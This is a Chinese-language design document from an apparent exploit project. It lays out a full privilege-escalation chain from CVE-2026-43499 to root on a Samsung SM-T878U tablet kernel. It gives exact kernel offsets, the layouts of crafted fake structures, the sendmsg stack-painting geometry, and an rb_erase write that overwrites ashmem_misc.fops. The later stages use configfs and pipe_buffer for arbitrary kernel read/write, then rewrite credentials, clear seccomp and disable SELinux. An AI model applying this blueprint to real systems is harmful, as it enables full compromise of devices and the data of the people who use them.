# ROOT_CHAIN_THEORY.md — 从 CVE-2026-43499 到 root 的完整理论闭环

> **范围**：本文件只做**理论论证**，不做代码改动。
> **权威来源**：设备二进制 `firmware_extract/ap/boot_kernel.bin.elf`
> （`Linux 4.19.113-27114284`，`SM-T878U / gts7l`）+ 本仓库源码。
> `Kernel_T878USQS8DXE2/` / `Kernel_T978USQS8DXE1/` 只作**交叉参考**，与实机不完全一致。
> **建立日期**：2026-10-03。**上一版结论**：`PAINT_ORACLE_ANALYSIS.md`（判据更正）、
> `RTMUTEX_WEAPONIZATION.md` §15.19。

---

## §0 结论（先行）

1. **整条提权链共 5 环**。其中 **环 2 / 环 3 / 环 4 的代码已经全部存在于本仓库**
   （`util.c` 的 configfs 读写、`pipe.c` 的 pipe_buffer 劫持、`root.c` 的 cred 改写），
   并且逐行自洽、不依赖任何未实现的东西。
2. **唯一缺环是环 1：第一笔内核写。**
   它要完成的事情只有一件：

   ```
   *(uint64_t *)data_addr(ASHMEM_MISC_FOPS) = fake_fops;
   ```

   即把全局 `ashmem_misc.fops` 从真实的 `ashmem_fops` 改成我们页里的假 fops 表。
3. **环 1 在理论上成立**，且 §3.6 已把 `rt_mutex_adjust_prio_chain()` 的**每一行**
   逐条核对完毕：**全程无地雷**，函数会干净返回，写会落地。
4. **环 1 必须走 `rb_erase` 路径，且必须选它的「Case 1 变体」形态
   （`IONSTACK_FOPS_PI_RB_SHAPE=target-left`）。** 两条排除：
   - `rb_insert` 路径不可用：设备二进制里 `ashmem_misc.minor = 0xff`（≠ 0），
     而 `rb_insert` Case 3 的前置条件是 `*(TARGET-0x10) == 0`，在
     `TARGET = ashmem_misc.fops` 时不成立（见 §3.8.1）；
   - `ghostlock-right` / `target-right` 不可用：它们走 **Case 1**，`pc` 被钉死在
     `ASHMEM_MISC_FOPS - 0x08`，而 `pc` 又是 `child->__rb_parent_color` 的写值
     ⇒ **`fake_fops->owner` 被涂成非 0** ⇒ `fops_get()` → `try_module_get()` 必败
     ⇒ `open("/dev/ashmem")` 返回 `-ENODEV`，环 2 起不来（见 §3.8）。
   见 §3.8 —— **这是本文件相对既有文档的唯一实质性新增结论。**
5. 因此「理论上完全获得 root」是**成立的**：
   `环1(写 fops) → 环2(configfs 任意读写) → 环3(direct-map 任意读写) → 环4(cred/SELinux/root)`。
   剩下的是工程问题（时序、形状、可观测性），不是理论缺口。

---

## §1 全链总览

| 环 | 名称 | 产出 | 代码位置 | 状态 |
|---|---|---|---|---|
| 0 | 信息泄漏 + 受控内核页 | `kaslr_base`、`page_base`、页内 `fake_*` | `src/device/ionstack_perf_target.c`、`util.c:prepare_kernel_page()` | **实测可用** |
| 1 | **第一笔内核写** | `ashmem_misc.fops = fake_fops` | `rtmutex.c` + `main.c` + `util.c:prepare_skb_payload()` | **★唯一缺环** |
| 2 | 假 fops → configfs 任意内核读写 | `configfs_read_once()` / `configfs_write_once()` | `util.c:1198-1222`、`util.c:3395-3450` | 代码已就绪 |
| 3 | pipe_buffer 劫持 → direct-map 任意读写 | `pipe_read64()` / `pipe_write64()` | `pipe.c:492-616` | 代码已就绪 |
| 4 | cred / seccomp / SELinux → root | `uid=0`、`su` | `root.c:307-466` | 代码已就绪 |

```
环0  KASLR base + 受控页(page_base, fake_lock, fake_w0, fake_task, fake_fops)
      │
      ▼
环1  CVE-2026-43499 残余 waiter  ──sendmsg 栈涂写──►  链走 rb_erase
      │                                                   │
      │                                        *(ashmem_misc.fops) = fake_fops
      ▼
环2  open("/dev/ashmem") + ioctl(ASHMEM_SET_NAME) 伪造 configfs_buffer
      │        ⇒ pread = 任意内核读 / pwrite = 任意内核写
      ▼
环3  用环2 改一个 struct pipe_buffer: page=direct_to_page(addr), flags=CAN_MERGE
      │        ⇒ read()/write() = direct-map 任意读写
      ▼
环4  init_task.tasks 遍历 → task->real_cred/cred → uid=0 + CAP_FULL + sid=KERNEL
      │  + 清 TIF_SECCOMP / NO_NEW_PRIVS + selinux_enforcing=0
      ▼
     fork → setgid(0)/setuid(0) → install_embedded_su()  ⇒  root
```

---

## §2 环 0：前置（已实测可用，非缺环）

### 2.1 KASLR base

`[reroot] LEAK_OK kaslr_base=0xffffff8007ee8000 task=0xffffffc90cd09e80 cred=0x0 cred_hits=0 base_hits=424`

- 机制：perf 侧信道（`src/device/ionstack_perf_target.c`），把内核 `.text` 基址泄露到用户态。
- 另有 `slide_read_stext()`（`slide.c:460-514`）从 `/proc/sys/kernel/random/boot_id` 反推
  `_stext`（`SLIDE_NFULNL_LOGGER` 别名法）。两条路任选。
- **没有 KASLR 就没有环 1**：`data_addr(ASHMEM_MISC_FOPS)`、`text_addr(INIT_TASK)`、
  `fake_fops` 表里的 8 个函数指针全部需要它。

### 2.2 受控内核页 + 其地址

`prepare_good_kernel_page(PAGE_PAYLOAD_FOPS)` → `base`，实测样例：

```
[+] stage t878u-pselect-root page-ready base=ffffffc849a28000
    fake_lock=ffffffc849a284d0 fake_w0=ffffffc849a293a0
    fake_task=ffffffc849a2a380 fake_fops=ffffffc849a28180 binwrite=ffffffc849a2a180
```

- 机制：`mm_struct` slab 页的 UAF/reclaim —— KernelSnitch 碰撞求出页地址，再用
  `sendmsg` 的 sk_buff 数据把页内容**填成我们要的形状**（`util.c:2275-2664`）。
- 页内布局（`payload_base = base + SKB_DATA_DELTA = base - 0xe80`）：

  | 符号 | 页内偏移 | 实测地址 |
  |---|---|---|
  | `fake_fops` | `FOPS_OFF = 0x1000` | `base+0x180` |
  | `fake_lock` | `LOCK_OFF = 0x1350` | `base+0x4d0` |
  | `fake_w0` | `W0_OFF = 0x2220` | `base+0x13a0` |
  | `binwrite` | `SCRATCH_OFF = 0x3000` | `base+0x2180` |
  | `fake_task` | `FAKE_TASK_OFF = 0x3200` | `base+0x2380` |

  （`fake_*` 的绝对值都 = `base - 0xe80 + off`，与实测一致 ✓）

---

## §3 环 1：第一笔写（★唯一缺环）

### 3.1 CVE 机理：悬垂 + 无自愈路径

**缺陷**（`remove_waiter()`，rtmutex.c:1068-1119）：

```c
1079	current->pi_blocked_on = NULL;      /* ← BUG：应为 waiter->task->pi_blocked_on */
```

官方补丁 `3bfdc63936dd` 印证。

**为什么不会自愈**（`futex.c`，逐行）：

```c
3299	ret = handle_early_requeue_pi_wakeup(hb, &q, &key2, to);
3301	if (ret)
3302		goto out_put_keys;          /* ← 直接返回 */
...
3343	rt_mutex_wait_proxy_lock(pi_mutex, to, &rt_waiter);        /* 不执行 */
3346	if (ret && !rt_mutex_cleanup_proxy_lock(pi_mutex, &rt_waiter))  /* 不执行 */
```

`-EDEADLK` 时 `futex_requeue()` 在 `futex.c:2171-2187` `break`，
**没有执行 2189 的 `requeue_futex()`** ⇒ W 的 `futex_q.key` 仍是 `key1 ≠ key2`
⇒ `handle_early_requeue_pi_wakeup()`（`futex.c:3173`，**只动 `q`，不碰 `pi_blocked_on`**）
必然返回非零 ⇒ 走 3302。

而 `rt_mutex_cleanup_proxy_lock()`（rtmutex.c:1889-1924）内部的
`remove_waiter(lock, waiter)`（1911-1914）是**唯一能在 W 自己的上下文里清 `pi_blocked_on` 的地方**。
它不执行 ⇒ **`W->pi_blocked_on` 永久悬垂指向已出栈的 `rt_waiter`** ✓

实测证据：`[*] requeue ret=-1 errno=35`（`EDEADLK == 35`）。

### 3.2 vehicle：`sendmsg` 双栈拷贝，落点 = `rt_waiter + 0x28`

`___sys_sendmsg()` 自己**没有** `move_addr_to_kernel`；裸拷贝发生在
`copy_msghdr_from_user()` → `__copy_msghdr_from_user()`（`net/socket.c:2037-2044`）：

```c
	if (msg.msg_name && kmsg->msg_namelen) {
		if (!save_addr) {                       /* ___sys_sendmsg 传 NULL ⇒ 成立 */
			err = move_addr_to_kernel(msg.msg_name,     /* 用户指针 */
						  kmsg->msg_namelen, /* ≤0x80，零校验 */
						  kmsg->msg_name);   /* = &address，内核栈 */
```

设备二进制几何（`0x99179fc: sub sp,sp,#0x190`、`0x9917a08: add x29,sp,#0x140`、
`0x9917a3c: sub x10,x29,#0x88`、`0x9917a48: str x10,[x2]`）：

```
rt_waiter = E - 0x190      （0x818e67c: add x0,sp,#0xc0 → bl rt_mutex_init_waiter）
address   = E - 0x168
⇒ address = rt_waiter + 0x28
```

**为什么 `msg_iovlen=1` 不破坏残余 waiter**：`iovstack` @ `sp+0x38 = E-0x1e8`，
1 项 ⇒ 只写 `[E-0x1e8, E-0x1d8)`，碰不到 `E-0x190` ✓

### 3.3 可涂 / 不可涂字段（几何的直接推论）

`paint[]` 从 `rt_waiter+0x28` 开始，`paint_namelen = 0x28`（`main.c:657-673`）：

| `paint[]` 偏移 | 写入地址 | 命中字段 | 可控？ |
|---|---|---|---|
| — | `rt_waiter+0x00` | `tree_entry` | **否**（在 +0x28 之前） |
| — | `rt_waiter+0x18` | `pi_tree_entry` | **否**（在 +0x28 之前） |
| `+0x08` | `rt_waiter+0x30` | `task` | 是 |
| `+0x10` | `rt_waiter+0x38` | **`lock`** | 是 |
| `+0x18` | `rt_waiter+0x40` | **`prio`** | 是 |
| `+0x20` | `rt_waiter+0x48` | `deadline` | 是 |

> **这是整条链最关键的一条推论**：栈上 waiter 的 `tree_entry` / `pi_tree_entry`
> **不可控**，所以「写目标 / 写值」**不能**放在它们上面，只能放在**我们页里的
> `fake_w0` 的 `tree_entry` / `pi_tree_entry`** 上。§3.7 会说明这恰好是可行的。

### 3.4 触发：consumer → `rt_mutex_adjust_pi(W)`

```c
/* rtmutex.c:1126-1147 */
1134	waiter = task->pi_blocked_on;                        /* = 涂过的 waiter */
1135	if (!waiter || rt_mutex_waiter_equal(waiter, task_to_waiter(task))) {
1136		raw_spin_unlock_irqrestore(&task->pi_lock, flags);
1137		return;                                      /* ← 门 */
1138	}
1139	next_lock = waiter->lock;                            /* = fake_lock */
...
1145	rt_mutex_adjust_prio_chain(task, RT_MUTEX_MIN_CHAINWALK, NULL,
1146				   next_lock, NULL, task);
```

`rtmutex.c:230-231`：

```c
#define task_to_waiter(p)	\
	&(struct rt_mutex_waiter){ .prio = (p)->prio, .deadline = (p)->dl.deadline }
```

⇒ `task_to_waiter(W)` **只带 `W->prio` 与 `W->dl.deadline`**，不读 `waiter->task`。

### 3.5 两道门：**相等则早退**

`rt_mutex_waiter_equal()`（rtmutex.c:252-269）非 DL 时只比 `prio`：

```c
	if (left->prio != right->prio)
		return 0;
	if (dl_prio(left->prio))
		return left->deadline == right->deadline;
	return 1;
```

| 位置 | 代码 | 相等（`waiter->prio == W->prio`） | 不等 |
|---|---|---|---|
| rtmutex.c:1135 | `if (equal) return;` | **早退，永不读 `waiter->lock`** | 继续 ✓ |
| rtmutex.c:569 | `if (equal) { if (!detect_deadlock) goto out_unlock_pi; }` | **安全退出** | 继续 ✓ |

`MIN_CHAINWALK` ⇒ `detect_deadlock = false`（rtmutex.c:462）⇒ 两处都是「相等即停」。

**推论（与 `PAINT_ORACLE_ANALYSIS.md` §4.4 一致）**：

- 未涂写：`waiter->prio = 120`（内核在 `rtmutex.c:957` 写入的残余值，不是栈垃圾），
  `W->prio = 120` ⇒ **相等 ⇒ 门关 ⇒ 存活**。
- 涂成 `prio ≠ 120`（121 / 139 / 250）⇒ **门开 ⇒ 链走到底** ⇒ 写落地 / 崩。
- ⇒ **「崩溃 = 涂写落地」**；「存活 = 未落地」。

### 3.6 链走逐行验证（`rt_mutex_adjust_prio_chain`）

调用：`rt_mutex_adjust_prio_chain(W, MIN_CHAINWALK, orig_waiter=NULL,
orig_lock=NULL, next_lock=fake_lock, top_task=W)`。
`task = W`，`lock = fake_lock`（初值 = `next_lock`）。

| 行 | 代码 | 本次取值 | 判定 |
|---|---|---|---|
| 460 | `bool requeue = true;` | — | — |
| 462 | `detect_deadlock = rt_mutex_cond_detect_deadlock(NULL, MIN_CHAINWALK)` | **false** | 552-570 两分支都不会把 `requeue` 置 false ⇒ 一定会到 664/685/723 |
| 507 | `waiter = task->pi_blocked_on` | 涂过的 `&W_waiter` | ✓ |
| 518 | `if (!waiter) goto out_unlock_pi;` | 非空 | 过 |
| 525 | `orig_waiter == NULL` | — | 整块跳过 |
| 537 | `if (next_lock != waiter->lock) goto out_unlock_pi;` | `fake_lock == fake_lock` | 过 |
| 545 | `top_waiter = orig_waiter = NULL` | — | **整块跳过（546-560）** |
| **569** | `if (equal) goto out_unlock_pi;` | `prio(≠120) != W->prio(120)` | **过（门开）** |
| 579 | `lock = waiter->lock` | `fake_lock` | ✓ |
| 585 | `raw_spin_trylock(&lock->wait_lock)` | `fake_lock->wait_lock = 0` ⇒ 成功 | 过 |
| 600 | `if (lock == orig_lock \|\| owner(lock) == top_task)` | `NULL`、`fake_task ≠ W` | **不走安全出口**（要继续） |
| 661 | `prerequeue_top_waiter = rt_mutex_top_waiter(fake_lock)` | `waiters.rb_leftmost = fake_w0` | ✓ |
| 664 | `rt_mutex_dequeue(fake_lock, waiter)` | `RB_EMPTY_NODE(&waiter->tree_entry)` **为真** | **早退（no-op）** ✓ 见下 |
| 682 | `waiter->prio = task->prio` | 覆盖成 120 | 无害（门已过） |
| 685 | `rt_mutex_enqueue(fake_lock, waiter)` | 从 `fake_w0`（prio 250 > 120）向左下降 | 惰性写入，见下 ✓ |
| 698 | `if (!rt_mutex_owner(lock)) return 0;` | `owner = fake_task\|1 ≠ 0` | 继续 |
| 711-713 | `task = owner`、`get_task_struct`、`raw_spin_lock(&task->pi_lock)` | `fake_task`，`usage 0x100→0x101`，`pi_lock=0` | ✓ |
| **716** | `if (waiter == rt_mutex_top_waiter(lock))` | 685 把 `rb_leftmost` 设成 `&waiter->tree_entry` ⇒ **相等** | **TRUE ⇒ 进 723** |
| **723** | `rt_mutex_dequeue_pi(fake_task, fake_w0)` | `rb_erase_cached(&fake_w0->pi_tree_entry, &fake_task->pi_waiters)` | **★写落地** |
| 724 | `rt_mutex_enqueue_pi(fake_task, waiter)` | `pi_waiters.rb_root = 0` ⇒ `parent = NULL` ⇒ `__rb_insert` 立即 `return` | 安全 ✓ |
| 725 | `rt_mutex_adjust_prio(fake_task)` | `rt_mutex_setprio(fake_task, NULL)` ⇒ `prio == p->prio` ⇒ `goto out_unlock` | 安全 ✓ 见下 |
| 759 | `next_lock = task_blocked_on_lock(fake_task)` | `pi_blocked_on = 0` ⇒ `NULL` | — |
| 777 | `if (!next_lock) goto out_put_task;` | — | 结束 |
| 793 | `put_task_struct(fake_task)` | `usage 0x101→0x100`（≠0） | 不释放 ✓ |

#### 3.6.1 664 为什么是 no-op（**写原语的硬约束**）

`remove_waiter()`（rtmutex.c:1078）→ `rt_mutex_dequeue()` → `RB_CLEAR_NODE(&waiter->tree_entry)`
（`= 0x8148ddc: str x23,[x23]`）把 `tree_entry.__rb_parent_color` 写成**它自己的地址**。
`rt_mutex_dequeue()`（rtmutex.c:294-301）第一步就是：

```c
	if (RB_EMPTY_NODE(&waiter->tree_entry))
		return;
```

⇒ **664 必然早退**。且 `tree_entry` 在 `rt_waiter+0x00`，**涂写（从 +0x28 起）碰不到它**，
`RB_CLEAR_NODE` 的值得以保留 ⇒ 这条推论自洽 ✓

> **结论**：`rb_erase` 在 **664（栈 waiter 的 `tree_entry`）** 上是**死的**；
> 活着的只有 **685（`rb_insert`）** 与 **723（我们页里 `fake_w0->pi_tree_entry` 的 `rb_erase`）**。

#### 3.6.2 685 为什么惰性

`rb_add_cached(&waiter->tree_entry, &fake_lock->waiters, rt_mutex_waiter_less)`：

- 起点 `*link = fake_lock->waiters.rb_root.rb_node = fake_w0`；
- `rt_mutex_waiter_less(waiter, fake_w0)`：`waiter->prio(120) < fake_w0->prio(250)` ⇒ **向左**；
- `fake_w0->tree_entry.rb_left = 0` ⇒ 下降结束，`parent = fake_w0`，`leftmost = true`；
- `rb_link_node(&waiter->tree_entry, fake_w0, &fake_w0->rb_left)`；
- `rb_insert_color_cached(node, tree, leftmost=true)` ⇒ `fake_lock->waiters.rb_leftmost = node`
  （**这正是 716 为真的原因**），然后 `rb_insert_color` → `__rb_insert`：
  `parent = rb_red_parent(node) = fake_w0`，`rb_is_black(fake_w0)` =
  `fake_w0->tree_entry.__rb_parent_color & 1` = `1 & 1` = 1 ⇒ **BLACK ⇒ 立即 return** ✓

⇒ 685 只写我们页里的两个无害槽位，不产生越界写 ✓

#### 3.6.3 725 为什么安全（否则 `sched_class == NULL` 会崩）

`rt_mutex_adjust_prio(fake_task)` ⇒ `pi_task = fake_task->pi_blocked_on ? ... : NULL`
⇒ `rt_mutex_setprio(fake_task, NULL)`（`sched/core.c:4589`）：

```c
4598	prio = __rt_effective_prio(pi_task /*NULL*/, p->normal_prio);   /* = 120 */
4603	if (p->pi_top_task == pi_task && prio == p->prio && !dl_prio(prio))
4604		return;                          /* 快路径 A */
...
4623	if (prio == p->prio && !dl_prio(prio))
4624		goto out_unlock;                 /* 快路径 B */
```

`FAKE_TASK_PRIO = 120`、`fake_task->normal_prio = fake_task->prio = 120`
⇒ **快路径 B 必然命中**（即使 A 不命中）⇒ 在 4650 `prev_class = p->sched_class` 之前就退出
⇒ **不会**在 `sched_class == 0` 上解引用 ✓

> 注意：`rbinsert` 形状额外把 `pi_top_task` 置 0（`util.c:2493`）以命中快路径 A；
> `target-left` / `ghostlock-right` / `target-right` 形状 `pi_top_task = fake_task`，
> 命中快路径 B。三种都安全 —— 但只有 `target-left` 保住 `owner == 0`（§3.8）。

### 3.7 写原语：`rb_erase` → `__rb_change_child` ⇒ `*(ASHMEM_MISC_FOPS) = fake_fops`

`rt_mutex_dequeue_pi()`（rtmutex.c:327-336）：

```c
	if (RB_EMPTY_NODE(&waiter->pi_tree_entry))
		return;
	rb_erase_cached(&waiter->pi_tree_entry, &task->pi_waiters);
	RB_CLEAR_NODE(&waiter->pi_tree_entry);
```

代入 `task = fake_task`、`waiter = fake_w0` ⇒ `rb_erase_cached(&fake_w0->pi_tree_entry,
&fake_task->pi_waiters)`。

`__rb_erase_augmented()`（`include/linux/rbtree_augmented.h:163-269`）：

```c
168	struct rb_node *child = node->rb_right;
169	struct rb_node *tmp   = node->rb_left;
173	if (leftmost && node == *leftmost)
174		*leftmost = rb_next(node);
176	if (!tmp) {                                  /* ← Case 1：rb_left == NULL */
184		pc = node->__rb_parent_color;
185		parent = __rb_parent(pc);            /* = pc & ~3 */
186		__rb_change_child(node, child, parent, root);
187		if (child) { child->__rb_parent_color = pc; rebalance = NULL; }
```

`__rb_change_child()`（同文件 134-145）：

```c
	if (parent) {
		if (parent->rb_left == old)
			WRITE_ONCE(parent->rb_left, new);
		else
			WRITE_ONCE(parent->rb_right, new);       /* ← 走这条 */
	} else
		WRITE_ONCE(root->rb_node, new);
```

**代入**（`target-left` 形状，`util.c` 的 `fops_pi_rb_target_left` 分支）：

```
node   = &fake_w0->pi_tree_entry                    （我们页）
node->__rb_parent_color = write_pc    = fake_fops                  ← 写值
node->rb_right          = write_right = data_addr(ASHMEM_MISC_FOPS) ← child
node->rb_left           = write_left  = 0                          ⇒ Case 1
fake_task->pi_waiters.rb_root.rb_node = 0   ⇒ 173 的 *leftmost ≠ node，跳过 rb_next
```

- `pc     = fake_fops`（`FOPS_OFF = 0x1000`，16 对齐 ⇒ 偶 ⇒ `__rb_is_black` 为假
  ⇒ `rebalance` 不由 `pc` 决定，实际由 `child` 决定，见下）
- `parent = pc & ~3 = fake_fops` —— **落回我们自己的页**
- `__rb_change_child(node, child = data_addr(ASHMEM_MISC_FOPS), parent = fake_fops, root)`：
  - `parent->rb_left` @ `fake_fops + 0x10` = `FOPS_READ_OFF` = `configfs_read_file` ≠ `node`
    ⇒ 走 **else** ⇒ `WRITE_ONCE(parent->rb_right, child)`
    ⇒ `*(fake_fops + 0x08) = ASHMEM_MISC_FOPS`
    ⇒ 只打掉 `FOPS_LLSEEK_OFF`（`llseek`），而它本来就被 `put_fake_fops_table()`
      填成 `fake_w0 + 0x18` 这种垃圾值（`util.c:1202-1203`）
- `child != 0` ⇒ `child->__rb_parent_color = pc`
  ⇒ `*(data_addr(ASHMEM_MISC_FOPS)) = fake_fops` ← **★★★ 环 1 那一笔写 ★★★**

```
★★★   *(uint64_t *)data_addr(ASHMEM_MISC_FOPS) = fake_fops;   ★★★
```

- `rebalance = NULL`（`child` 非空）⇒ **不会**进 `__rb_erase_color` ✓
- `augment->propagate()` = `dummy_propagate`（no-op）✓
- **`fake_fops->owner` 保持 0** ✓ —— 这一点是**承重**的，见 §3.8

**为什么写目标 / 写值 100% 可控**：`node`、`child`、`pc` 三者**全部来自我们页里的
`fake_w0->pi_tree_entry`**。栈上残余 waiter 只贡献一个「它自己的地址」被当作
`rb_link_node` 的 `*rb_link` 值（在 685 里，写进 `fake_w0->rb_left`），
**不参与 723 的任何一次写**。这正是 §3.3「不可控字段在 +0x28 之前」所换来的结果。

### 3.8 ★ 三种落笔形态的取舍（`owner` 是承重墙）

`rb_erase` 只有三种落笔形态，逐一排除：

| 形态 | 节点构型 | 实际落笔 | 评价 |
|---|---|---|---|
| **Case 1**（176-192，`!tmp`） | `rb_right = child`、`rb_left = 0` | `*(pc & ~3 + 0x08) = child`；`*(child) = pc` | 写目标由 `pc` 决定，**写值 `child` 自由** |
| **Case 1 变体**（193-199，`!child`） | `rb_left = tmp`、`rb_right = 0` | `*(tmp) = pc`；`*(pc & ~3 + 0x08) = tmp` | **写目标 `tmp` 与写值 `pc` 都自由** ← 选它 |
| Case 2/3（200-265） | 两侧都非空 | 多次写 + `augment->copy/propagate` | 不可控，排除 |

`ghostlock-right` / `target-right` 用的是**第一种**：把 `ASHMEM_MISC_FOPS - 0x08` 塞进
`__rb_parent_color`，于是 `pc` 被钉死在 `ASHMEM_MISC_FOPS - 0x08`。而 `pc` 恰好又是
`child->__rb_parent_color = pc` 的**写值** ⇒ **`fake_fops->owner` 被写成
`ASHMEM_MISC_FOPS - 0x08`**。

`owner ≠ 0` 会立刻引爆 `fops_get()`（`include/linux/fs.h`）：

```c
#define fops_get(fops) \
	(((fops) && (fops)->owner) ? \
		(try_module_get((fops)->owner) ? (fops) : NULL) : (fops))
```

`try_module_get()`（设备二进制 `0xffffff8008196f44`，反汇编实测）：

```
ldr  w8, [x0]             ; module->state  @ +0x00  == 2 (MODULE_STATE_GOING) ⇒ 失败
cmp  w8, #0x2
b.eq <fail>
ldr  w8, [x19, #0x318]    ; module->refcnt @ +0x318 == 0                       ⇒ 失败
cbz  w8
```

代入 `owner = ASHMEM_MISC_FOPS - 0x08`：

- `*(owner + 0x00)` = `*(ASHMEM_MISC_FOPS - 0x08)` = **`ashmem_misc.name`**
  （指向 `"ashmem"` 的 `.rodata` 指针；低 32 位几乎不可能等于 2）⇒ 这一关能过
- `*(owner + 0x318)` = `*(ASHMEM_MISC_FOPS + 0x310)` = `ashmem_misc + 0x320`
  = **`abc_hub_driver.driver.acpi_match_table`**
  （`objdump -t`：`abc_hub_driver` @ `0xffffff800b38d450`；`platform_driver.driver` @ `+0x28`，
  `device_driver.acpi_match_table` @ `+0x30` ⇒ `+0x58`；`+0x320 - 0x2c8 = 0x58` ✓）
  ⇒ **静态零初始化，恒为 0** ⇒ **必败**

⇒ `fops_get()` 返回 NULL ⇒ `misc_open()` 走 `request_module()` 重试后 `goto fail`
⇒ `open("/dev/ashmem")` = **`-ENODEV`** ⇒ **环 2 根本起不来**。

**「Case 1 变体」把 `pc` 释放成自由量**：`pc = write_pc = fake_fops`（我们页里的地址），
于是 `parent = fake_fops`，两次落笔都留在我们页里（打掉 `llseek`），而
`*(data_addr(ASHMEM_MISC_FOPS)) = fake_fops` 干净落地，**`owner` 一动不动** ⇒ `fops_get()`
直接返回 `fake_fops`，**连 `try_module_get()` 都不进**。

> 旁证三条，说明这本来就是这套 PoC 的既定行为：
> 1. `repair_fake_fops_llseek()`（`fops.c:3026-3035`）专门把 `fake_fops->llseek`
>    改写成 `NOOP_LLSEEK` 并回读校验 —— 即「`llseek` 会被打掉」是已知的。
> 2. `fops.c:3349-3355` 的 ring-2 判据就是
>    `configfs_read_once(fd, misc_fops, &before, 8)` 要求 `before == fake_fops`。
> 3. 设备侧 runner `ionstack_reroot_device.c:1545-1549` 的 **`else` 分支**给出的
>    `auto_word3/4/5 = fake_fops / misc_fops_alias / 0` 正是同一构型。
>
> **`target-left` 就是把这条既定构型显式命名出来，让 sendmsg 涂写路线也能用它。**

### 3.8.1 为什么不能走 `rb_insert` 路径

`rb_insert` 路径（`__rb_insert` Case 3，`lib/rbtree.c:182-198`）：

```c
	gparent = rb_red_parent(parent);       /* = fake_w0->tree_entry.__rb_parent_color */
	tmp = gparent->rb_right;
	if (parent != tmp) {
		...
		tmp = parent->rb_right;         /* = 要写的值 */
		WRITE_ONCE(gparent->rb_left, tmp);    /* *(gparent+0x10) = VALUE */
		...
		__rb_rotate_set_parents(gparent, parent, root, RB_RED);
	}
```

`__rb_rotate_set_parents()` 内部会做 `__rb_change_child(old=gparent, new=parent,
rb_parent(gparent), root)`，其中 `rb_parent(gparent) = *(gparent+0x00) & ~3`。
⇒ **前置条件 `*(TARGET - 0x10) == 0`**（`util.c:2378-2382` 已写明）。
（`TARGET = gparent + 0x08`。）

**设备实测**（`boot_kernel.bin.elf`，`objdump -t` + 原始字节）：

```
ffffff800b38d188 l O .kernel2  ashmem_misc
   ashmem_misc+0x00 字节 = ff 00 00 00 00 00 00 00     ⇒ minor = 0xff (= MISC_DYNAMIC_MINOR = 255)
```

`ASHMEM_MISC_FOPS = ashmem_misc + 0x10`（`miscdevice`: `minor@0x0`, `name@0x8`, `fops@0x10`），
⇒ `TARGET - 0x10 = ashmem_misc + 0x00` ⇒ `*(TARGET-0x10) = 0xff ≠ 0`
⇒ **`rb_insert` Case 3 无法指向 `ashmem_misc.fops`**（会拿 `0xff & ~3 = 0xfc` 当 parent 去解引用）。

> 这条同时解释了为什么 `IONSTACK_INSERT_TARGET_OFF` 那条路只能做**自页自检**
> （`run_paint.sh` 旧默认 `0x3040/0x3080` 都落在 `payload_base` 内）：
> 它算出来的地址是 `payload_base + off`，而 `payload_base` 每次运行都变，
> 无法用环境变量指向固定的 `data_addr(ASHMEM_MISC_FOPS)`。

⇒ **环 1 的正式构型 = `IONSTACK_FOPS_PI_RB_SHAPE=target-left` + `IONSTACK_INSERT_TARGET_OFF=0`。**

### 3.9 完整字段构型表（环 1）

| 位置 | 字段 | 取值 | 理由 |
|---|---|---|---|
| 栈 `rt_waiter+0x30` | **`task`** | **`fake_task`** | **会被读**：725 → `task_top_pi_waiter(fake_task)->task` → `pi_task` → 4603。必须 == `fake_task->pi_top_task`，否则 `__task_rq_lock(fake_task)` 用未初始化的 `fake_task->cpu` |
| 栈 `rt_waiter+0x38` | **`lock`** | `fake_lock` | 579 `lock = waiter->lock`；也是 716 `BUG_ON(w->lock != lock)` |
| 栈 `rt_waiter+0x40` | **`prio`** | **≠ `W->prio`（120）** | 1135 / 569 两道门 |
| 栈 `rt_waiter+0x48` | `deadline` | 0 | 非 DL 不参与比较 |
| 页 `fake_lock+0x00` | `wait_lock.raw_lock` | 0 | 585 `trylock` 成功 |
| 页 `fake_lock+0x20` | `owner` | `fake_task \| 1` | **≠ `W` ⇒ 600 安全出口不触发** |
| 页 `fake_lock+0x10` | `waiters.rb_root.rb_node` | `fake_w0` | 685 下降起点 |
| 页 `fake_lock+0x18` | `waiters.rb_leftmost` | `fake_w0` | 661 `prerequeue_top_waiter = fake_w0` |
| 页 `fake_w0+0x00` | `tree_entry.__rb_parent_color` | `1`（BLACK） | 685 的 `__rb_insert` 立即 return |
| 页 `fake_w0+0x08` | `tree_entry.rb_right` | 0 | 同上 |
| 页 `fake_w0+0x10` | `tree_entry.rb_left` | 0 | 下降终点 |
| 页 `fake_w0+0x40` | `prio` | `130`（默认，> 120） | 下降向左 ⇒ 新 waiter 成为 leftmost ⇒ 716 为真 |
| 页 `fake_w0+0x18` | `pi_tree_entry.__rb_parent_color` | **`fake_fops`** | **写值**（`pc`），同时决定 `parent` |
| 页 `fake_w0+0x20` | `pi_tree_entry.rb_right` | **`data_addr(ASHMEM_MISC_FOPS)`** | **`child` ⇒ 被写进 `parent->rb_right`** |
| 页 `fake_w0+0x28` | `pi_tree_entry.rb_left` | 0 | 走 Case 1 |
| 页 `fake_task+0x8e0/0x8e8` | `pi_waiters` | `{0, 0}` | 723 的 root；也避开 173 的 `rb_next` |
| 页 `fake_task+0x8f8` | `pi_blocked_on` | 0 | 759 `next_lock = NULL` ⇒ 链走终止 |
| 页 `fake_task+0x8c8` | `pi_lock` | 0 | 713 `raw_spin_lock` |
| 页 `fake_task+0x68` | `usage` | `0x100` | 712/793 的 `get/put_task_struct` |
| 页 `fake_task+0x5e0` | `exit_state` | 1 | `__put_task_struct` 的 WARN/BUG 规避 |
| 页 `fake_task+0xac/0xb4` | `prio` / `normal_prio` | 120 | 4603 的 `prio == p->prio` |
| 页 `fake_task+0x8f0` | `pi_top_task` | **必须 == 涂写的 `waiter->task`** | 4603 快路径 A。`fake_task` + paint `task=fake_task`，或 `0` + paint `task=0`，**不能混搭** |

---

## §4 环 2：假 fops → configfs 任意内核读写（代码已就绪）

### 4.1 假 fops 表（`util.c:1198-1222`）

| 槽 | 值 |
|---|---|
| `owner` @0x00 | **0**（必须保持 0 —— `target-left` 的 Case 1 变体只打 `llseek`，不碰 `owner`；见 §3.8） |
| `llseek` @0x08 | `fake_w0 + 0x18`，**运行期被环 1 的 `__rb_change_child` 改写成 `ASHMEM_MISC_FOPS`**，随后由 `repair_fake_fops_llseek()`（`fops.c:3026`）改成 `NOOP_LLSEEK` |
| **`read` @0x10** | `text_addr(CONFIGFS_READ_FILE)` = `_text+0x3044bc` |
| **`write` @0x18** | `text_addr(CONFIGFS_WRITE_FILE)` = `_text+0x30464c` |
